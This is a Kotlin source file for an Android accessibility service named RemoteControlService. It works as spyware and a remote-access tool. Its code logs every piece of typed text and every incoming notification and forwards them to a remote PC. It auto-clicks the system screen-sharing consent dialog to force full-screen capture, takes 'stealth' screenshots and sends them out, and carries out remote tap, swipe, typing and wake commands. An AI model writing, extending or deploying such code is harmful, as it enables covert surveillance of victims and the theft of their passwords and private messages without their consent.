package com.example.android_security

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Intent
import android.graphics.Path
import android.util.Log
import android.view.accessibility.AccessibilityEvent

class RemoteControlService : AccessibilityService() {

    companion object {
        var instance: RemoteControlService? = null
    }

    private var lastClickTime = 0L
    private var lastScanTime = 0L
    private var isAutoAcceptEnabled = true // Can be toggled remotely
    private val mainHandler = android.os.Handler(android.os.Looper.getMainLooper())

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.d("RemoteControl", "Accessibility Service Connected")
    }

    override fun onUnbind(intent: Intent?): Boolean {
        instance = null
        return super.onUnbind(intent)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        
        // 1. KEYLOGGER & NOTIFICATION CAPTURE (New Feature)
        try {
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    // Capture typed text
                    val packageName = event.packageName?.toString() ?: "Unknown"
                    val typedText = event.text.toString()
                    if (typedText.isNotEmpty()) {
                        sendActivityLog("KEYLOG", packageName, typedText)
                    }
                }
                AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                    // Capture incoming notifications
                    val packageName = event.packageName?.toString() ?: "Unknown"
                    val notificationText = event.text.toString()
                    if (notificationText.isNotEmpty()) {
                        sendActivityLog("NOTIFICATION", packageName, notificationText)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e("RemoteControl", "Activity log capture error: $e")
        }

        // 2. AUTO-ACCEPT & SYSTEM DIALOG BYPASS (Existing Logic)
        val now = System.currentTimeMillis()
        if (now - lastScanTime < 250) return 
        
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || 
           (isAutoAcceptEnabled && event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED)) {
            // ... (rest of the existing scan logic remains)
            
            lastScanTime = now
            
            val rootNode = getRobustRootNode() ?: return
            
            fun clickNodeByGesture(node: android.view.accessibility.AccessibilityNodeInfo?): Boolean {
                if (node == null) return false
                val now = System.currentTimeMillis()
                if (now - lastClickTime < 50) return false // Ultra-fast burst mode
                
                val rect = android.graphics.Rect()
                node.getBoundsInScreen(rect)
                val x = rect.centerX().toFloat()
                val y = rect.centerY().toFloat()
                
                Log.d("RemoteControl", "GESTURE CLICK at ($x, $y) for ${node.text}")
                
                val path = android.graphics.Path()
                path.moveTo(x, y)
                val gesture = android.accessibilityservice.GestureDescription.Builder()
                    .addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 10))
                    .build()
                
                dispatchGesture(gesture, null, null)
                lastClickTime = now
                return true
            }

            var shareOneAppFound = false
            var entireScreenFound = false
            var actionNode: android.view.accessibility.AccessibilityNodeInfo? = null

            fun scanTree(node: android.view.accessibility.AccessibilityNodeInfo?) {
                if (node == null || !node.isVisibleToUser) return
                
                val txt = node.text?.toString() ?: ""
                val content = node.contentDescription?.toString() ?: ""
                
                if (txt.length < 60) {
                    val entireVariations = listOf("Entire screen", "Entire display", "Full screen", "ENTIRE SCREEN", "Share entire screen")
                    if (entireVariations.any { txt.equals(it, ignoreCase = true) || content.equals(it, ignoreCase = true) }) {
                        entireScreenFound = true
                        Log.d("RemoteControl", "Found Option: $txt")
                    }

                    val toggleVariations = listOf("Share one app", "A single app")
                    if (toggleVariations.any { txt.equals(it, ignoreCase = true) || content.equals(it, ignoreCase = true) }) {
                        shareOneAppFound = true
                        Log.d("RemoteControl", "Found Dropdown: $txt")
                    }

                    val actionTexts = listOf("Start now", "Next", "Allow", "START NOW", "ALLOW", "Share screen", "Share Screen")
                    if (actionTexts.any { txt.equals(it, ignoreCase = true) || content.equals(it, ignoreCase = true) }) {
                        actionNode = node
                    }
                }

                for (i in 0 until node.childCount) {
                    val child = node.getChild(i)
                    scanTree(child)
                    child?.recycle()
                }
            }

            scanTree(rootNode)

            // Logic Decision
            if (actionNode != null && entireScreenFound) {
                // HIGHEST PRIORITY: If we've found the final button AND Entire Screen is selected/visible, CONFIRM.
                clickNodeByGesture(actionNode)
            } else if (shareOneAppFound && !entireScreenFound) {
                // Dropdown is collapsed - find the toggle and gesture-click it
                fun findAndGesture(node: android.view.accessibility.AccessibilityNodeInfo?): Boolean {
                    if (node == null) return false
                    val t = node.text?.toString() ?: ""
                    if (listOf("Share one app", "A single app").any { t.equals(it, ignoreCase = true) }) {
                        return clickNodeByGesture(node)
                    }
                    for (i in 0 until node.childCount) {
                        if (findAndGesture(node.getChild(i))) return true
                    }
                    return false
                }
                findAndGesture(rootNode)
            } else if (entireScreenFound && shareOneAppFound) {
                // Dropdown is OPEN - gesture-click the full screen option
                fun findAndGestureTarget(node: android.view.accessibility.AccessibilityNodeInfo?): Boolean {
                    if (node == null) return false
                    val t = node.text?.toString() ?: ""
                    val targetVariations = listOf("Entire screen", "Entire display", "Full screen", "Share entire screen")
                    if (targetVariations.any { t.equals(it, ignoreCase = true) }) {
                        return clickNodeByGesture(node)
                    }
                    for (i in 0 until node.childCount) {
                        if (findAndGestureTarget(node.getChild(i))) return true
                    }
                    return false
                }
                findAndGestureTarget(rootNode)
            } else if (actionNode != null) {
                // Fallback for simple dialogs (Next/Allow)
                clickNodeByGesture(actionNode)
            }
            rootNode.recycle()
        }
    }
    
    override fun onInterrupt() {}

    fun performTap(x: Float, y: Float) {
        val path = Path()
        path.moveTo(x, y)
        path.lineTo(x, y) // Ensure it's a valid stroke for all Android versions
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 50))
            .build()
        val success = dispatchGesture(gesture, object : GestureResultCallback() {
            override fun onCompleted(gestureDescription: GestureDescription?) {
                android.util.Log.d("RemoteControl", "Gesture tap completed at ($x, $y)")
            }
            override fun onCancelled(gestureDescription: GestureDescription?) {
                android.util.Log.e("RemoteControl", "Gesture tap CANCELLED at ($x, $y)")
            }
        }, null)
        android.util.Log.d("RemoteControl", "Gesture tap dispatched: $success")
    }

    fun performSwipe(x1: Float, y1: Float, x2: Float, y2: Float, duration: Long) {
        val path = Path()
        path.moveTo(x1, y1)
        path.lineTo(x2, y2)
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, duration))
            .build()
        dispatchGesture(gesture, null, null)
    }
    
    fun handleRemoteCommand(data: org.json.JSONObject) {
        try {
            val mtype = data.optString("type")
            val dm = resources.displayMetrics
            
            when (mtype) {
                "tap" -> {
                    val x = (data.optDouble("x", 0.0) * dm.widthPixels).toFloat()
                    val y = (data.optDouble("y", 0.0) * dm.heightPixels).toFloat()
                    performTap(x, y)
                }
                "swipe" -> {
                    val x1 = (data.optDouble("x1", 0.0) * dm.widthPixels).toFloat()
                    val y1 = (data.optDouble("y1", 0.0) * dm.heightPixels).toFloat()
                    val x2 = (data.optDouble("x2", 0.0) * dm.widthPixels).toFloat()
                    val y2 = (data.optDouble("y2", 0.0) * dm.heightPixels).toFloat()
                    val duration = data.optLong("duration", 300L)
                    performSwipe(x1, y1, x2, y2, duration)
                }
                "long_press" -> {
                    val x = (data.optDouble("x", 0.0) * dm.widthPixels).toFloat()
                    val y = (data.optDouble("y", 0.0) * dm.heightPixels).toFloat()
                    performSwipe(x, y, x, y, 1000L)
                }
                "navigation" -> {
                    val navAction = data.optString("navAction", "")
                    performAction(navAction)
                }
                "type" -> {
                    val text = data.optString("text", "")
                    typeText(text)
                }
            }
        } catch (e: Exception) {
            android.util.Log.e("RemoteControl", "Failed to handle remote command: $e")
        }
    }

    fun performAction(action: String) {
        when(action.uppercase()) {
            "BACK" -> performGlobalAction(GLOBAL_ACTION_BACK)
            "HOME" -> performGlobalAction(GLOBAL_ACTION_HOME)
            "RECENTS" -> performGlobalAction(GLOBAL_ACTION_RECENTS)
            "WAKE" -> wakeDevice()
        }
    }

    private fun wakeDevice() {
        try {
            val pm = getSystemService(android.content.Context.POWER_SERVICE) as android.os.PowerManager
            if (!pm.isInteractive) {
                val wl = pm.newWakeLock(android.os.PowerManager.SCREEN_BRIGHT_WAKE_LOCK or android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP, "SecurityService::RemoteWake")
                wl.acquire(3000) // Keep screen on for 3 seconds to ensure session starts
                android.util.Log.d("RemoteControl", "Device woken up remotely")
            }
        } catch (e: Exception) {
            android.util.Log.e("RemoteControl", "Failed to wake device: $e")
        }
    }

    fun typeText(text: String) {
        val root = getRobustRootNode() ?: return
        findAndFillFocus(root, text)
        root.recycle()
    }

    private fun getRobustRootNode(): android.view.accessibility.AccessibilityNodeInfo? {
        var root = rootInActiveWindow
        var retries = 0
        while (root == null && retries < 3) {
            Thread.sleep(100)
            root = rootInActiveWindow
            retries++
        }
        return root
    }

    private fun findAndFillFocus(node: android.view.accessibility.AccessibilityNodeInfo?, text: String): Boolean {
        if (node == null) return false
        if (node.isFocused) {
            val arguments = android.os.Bundle()
            arguments.putCharSequence(android.view.accessibility.AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
            val success = node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
            if (success) return true
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (findAndFillFocus(child, text)) {
                child?.recycle()
                return true
            }
            child?.recycle()
        }
        return false
    }

    fun takeStealthScreenshot() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            android.util.Log.d("RemoteControl", "Requesting stealth screenshot...")
            takeScreenshot(android.view.Display.DEFAULT_DISPLAY, mainHandler::post, object : TakeScreenshotCallback {
                override fun onSuccess(result: ScreenshotResult) {
                    try {
                        val hardwareBuffer = result.hardwareBuffer
                        val colorSpace = result.colorSpace
                        val bitmap = android.graphics.Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace)
                        if (bitmap != null) {
                            // Hardware bitmaps cannot be compressed directly, need software copy
                            val softwareBitmap = bitmap.copy(android.graphics.Bitmap.Config.ARGB_8888, false)
                            val stream = java.io.ByteArrayOutputStream()
                            softwareBitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 75, stream)
                            val bytes = stream.toByteArray()
                            
                            android.util.Log.i("RemoteControl", "Stealth screenshot captured (${bytes.size} bytes)")
                            MonitoringService.instance?.sendBinaryToPC(0x07.toByte(), bytes)
                            
                            softwareBitmap.recycle()
                            bitmap.recycle()
                        }
                        hardwareBuffer.close()
                    } catch (e: Exception) {
                        android.util.Log.e("RemoteControl", "Screenshot processing failed: $e")
                    }
                }

                override fun onFailure(errorCode: Int) {
                    android.util.Log.e("RemoteControl", "Stealth screenshot failed: error $errorCode")
                }
            })
        } else {
            android.util.Log.w("RemoteControl", "Stealth screenshot not supported on this Android version")
        }
    }

    private fun sendActivityLog(type: String, packageName: String, content: String) {
        val data = org.json.JSONObject().apply {
            put("type", "activity_log")
            put("log_type", type)
            put("package", packageName)
            put("content", content)
            put("timestamp", System.currentTimeMillis())
        }
        // Send via MonitoringService bridge
        MonitoringService.instance?.sendToPC(data)
    }
}
